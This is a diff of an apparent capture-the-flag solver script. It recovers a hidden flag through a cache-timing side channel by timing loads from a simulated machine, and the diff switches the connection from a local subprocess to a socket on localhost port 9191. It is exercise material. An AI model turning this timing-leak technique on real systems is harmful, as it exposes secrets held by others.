@@ -1,21 +1,20 @@
-import subprocess
+import socket
 
 
-def issue_cmd(proc, cmd):
-    proc.stdin.write('{}\n'.format(cmd))
-    proc.stdin.flush()
-    return float(proc.stdout.readline().strip())
+def issue_cmd(sock, cmd):
+    sock.sendall('{}\n'.format(cmd))
+    return float(sock.recv(4096).strip())
 
 
-def get_flag(proc):
+def get_flag(sock):
     flag = []
     for addr in range(256):
         for guess in range(256):
-            issue_cmd(proc, 'mvl a {}'.format(addr))
-            issue_cmd(proc, 'ldi b a')
-            issue_cmd(proc, 'clear')
-            issue_cmd(proc, 'ldi c b')
-            time = issue_cmd(proc, 'ld d {}'.format(guess))
+            issue_cmd(sock, 'mvl a {}'.format(addr))
+            issue_cmd(sock, 'ldi b a')
+            issue_cmd(sock, 'clear')
+            issue_cmd(sock, 'ldi c b')
+            time = issue_cmd(sock, 'ld d {}'.format(guess))
             if time < 0.05:
                 if guess == 0:
                     return ''.join(flag)
@@ -25,11 +24,9 @@ def get_flag(proc):
 
 
 def main():
-    proc = subprocess.Popen(['python', './cache.py'], stdin=subprocess.PIPE,
-                            stdout=subprocess.PIPE)
-    flag = get_flag(proc)
-    print(flag)
-    proc.kill()
+    sock = socket.socket()
+    sock.connect(('localhost', 9191))
+    print(get_flag(sock))
 
 
 if __name__ == '__main__':
